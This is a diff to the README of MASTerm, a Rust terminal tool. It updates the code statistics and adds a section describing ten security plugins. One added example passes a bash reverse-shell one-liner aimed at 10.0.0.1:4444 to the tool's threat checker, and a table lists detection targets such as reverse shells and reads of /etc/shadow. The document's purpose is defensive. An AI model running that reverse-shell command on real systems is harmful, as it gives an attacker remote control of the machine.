@@ -32,14 +32,16 @@
 </p>
 
 <p align="center">
-  <img src="https://img.shields.io/badge/Lines%20of%20Code-30%2C000+-brightgreen" alt="LOC">
-  <img src="https://img.shields.io/badge/Crates-4-blue" alt="Crates">
-  <img src="https://img.shields.io/badge/Plugins-11-purple" alt="Plugins">
+  <img src="https://img.shields.io/badge/Lines%20of%20Code-35%2C000+-brightgreen" alt="LOC">
+  <img src="https://img.shields.io/badge/Crates-6-blue" alt="Crates">
+  <img src="https://img.shields.io/badge/Plugins-21-purple" alt="Plugins">
 </p>
 
 ---
 
 ## 🎯 Quick Start
+
+Run the interactive installer to set up MASTerm and choose your features:
 
 ```bash
 # One-command install (macOS/Linux)
@@ -158,7 +160,37 @@ MASTerm automatically detects and displays context:
 | `dev` | Git + language detection | Daily development |
 | `ops` | All guards enabled | Production work |
 
----
+### 🔐 Enterprise-Grade Security
+
+MASTerm includes 10 built-in security plugins for threat detection and command auditing:
+
+```bash
+$ masterm security check -- "bash -i >& /dev/tcp/10.0.0.1/4444"
+  ⚠️  Threats Detected:
+     🐚 Reverse Shell - Bash reverse shell
+  Risk Level: Critical
+```
+
+| Plugin | Protection |
+|--------|------------|
+| **Secret Detection** | Blocks leaked API keys, tokens, passwords |
+| **Audit Logging** | Forensic-grade command logging with hash chains |
+| **Privilege Escalation** | Environment-aware sudo/su warnings |
+| **Suspicious Patterns** | Detects reverse shells, encoded commands |
+| **Network Monitor** | Tracks outbound connections |
+| **Package Audit** | Typosquatting detection, malicious package blocklist |
+| **File Integrity** | Alerts on .ssh, .env, /etc/shadow access |
+| **SSH/GPG Monitor** | Key generation, export, deletion alerts |
+| **IP Reputation** | Threat intelligence integration |
+| **Sandbox Mode** | Restricted execution environment |
+
+```bash
+masterm security status     # View security dashboard
+masterm security patterns   # View detection patterns
+masterm security audit show # View audit logs
+```
+
+See [SECURITY.md](SECURITY.md) for detailed documentation.
 
 ## 📦 Installation
 
@@ -510,11 +542,11 @@ masterm mode minimal       # Use minimal mode
 | Metric | Value |
 |--------|-------|
 | **Language** | Rust 🦀 |
-| **Lines of Code** | ~30,000 |
-| **Crates** | 4 |
-| **Plugins** | 11 built-in |
+| **Lines of Code** | ~35,000 |
+| **Crates** | 6 |
+| **Plugins** | 21 built-in (11 context + 10 security) |
 | **Shells** | 4 supported |
-| **Commands** | 12 CLI commands |
+| **CLI Commands** | 13 |
 
 ### Architecture
 
@@ -522,9 +554,11 @@ masterm mode minimal       # Use minimal mode
 masterm/
 ├── crates/
 │   ├── masterm-core      # Core engine (config, context, prompt)
-│   ├── masterm-cli       # CLI binary (12 commands)
-│   ├── masterm-plugins   # Built-in plugins (11 plugins)
-│   └── masterm-shell     # Shell adapters (4 shells)
+│   ├── masterm-cli       # CLI binary (13 commands)
+│   ├── masterm-plugins   # Built-in plugins (21 plugins)
+│   ├── masterm-security  # Security library (patterns, audit, reputation)
+│   ├── masterm-shell     # Shell adapters (4 shells)
+│   └── masterm-tui       # Terminal UI dashboard
 ├── scripts/              # Installation scripts
 └── install.sh            # One-command installer
 ```
